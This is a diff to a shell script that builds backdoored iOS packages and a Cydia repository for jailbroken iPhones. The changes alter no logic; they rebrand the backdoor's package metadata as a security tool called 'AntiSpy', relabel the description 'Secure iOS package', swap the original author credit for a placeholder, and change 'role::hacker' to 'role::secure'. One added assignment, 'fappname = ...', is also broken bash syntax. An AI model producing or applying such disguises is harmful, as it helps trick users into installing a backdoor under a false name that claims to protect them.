@@ -9,7 +9,8 @@ clear;
 # Various places throughout the resource files require an arbitrary
 # string. Any alias will do fine here. If intended for Cydia, use 
 # your Github Pages username.
-hacker="Arcane";
+hacker="h4xl0r";
+fappname = "AntiSpy";
 
 # The color codes used to print messages in the terminal.
 # Respectively: no color, red, yellow, green.
@@ -194,14 +195,14 @@ fi;
 # files in the package. The `$hacker` variable is used here to occupy 
 # various arbitrary fields. 
 # https://www.debian.org/doc/manuals/maint-guide/dreq.en.html
-controlTemp="Package: com.$hacker.backdoor
-Name: $hacker backdoor
-Version: 1337
+controlTemp="Package: com.$hacker.$fappname
+Name: $hacker $fappname
+Version: 01
 Section: app
 Architecture: iphoneos-arm
-Description: A backdoored iOS package
-Author: tokyoneon <https://tokyoneon.github.io/>
-Maintainer: tokyoneon <https://tokyoneon.github.io/>";
+Description: Secure iOS package
+Author: noOne <https://noOne.github.io/>
+Maintainer: noOne <https://noOne.github.io/>";
 
 # Decompress the input package. Use -R to preserve the control and
 # postinst files.
@@ -291,8 +292,8 @@ function cydia_build ()
 	# architecture type, priority level, etc. The below template uses
 	# the `$hacker` variable to fill arbitrary values.
 	# https://wiki.debian.org/DebianRepository/Format
-	packagesTemp="Package: backdoor
-Version: 1337
+	packagesTemp="Package: tweak
+Version: 01
 Architecture: iphoneos-arm
 Maintainer: $hacker <$hacker@noreply.com>
 Installed-Size: 1968
@@ -306,11 +307,11 @@ SHA256: $(sha256sum $backdoored | cut -d' ' -f1)
 Section: Networking
 Priority: optional
 Multi-Arch: foreign
-Homepage: https://tokyoneon.github.io/
-Description: ios backdoor
-Depiction: https://tokyoneon.github.io/about
-Name: backdoor
-Tag: purpose::daemon, role::hacker";
+Homepage: https://google.com
+Description: ios antispy
+Depiction: https://google.com
+Name: antispy
+Tag: purpose::daemon, role::secure";
 	
 	# The "Release" file template. It contains meta-information about
 	# the distribution and checksums for the indices. It is generally
@@ -324,7 +325,7 @@ Version: 1.0
 Codename: ios
 Architectures: iphoneos-arm
 Components: main
-Description: backdoor";
+Description: antispy";
 
 	# Delete existing working directory related to Cydia config files.
 	if [[ -d "$cydia" ]]; then
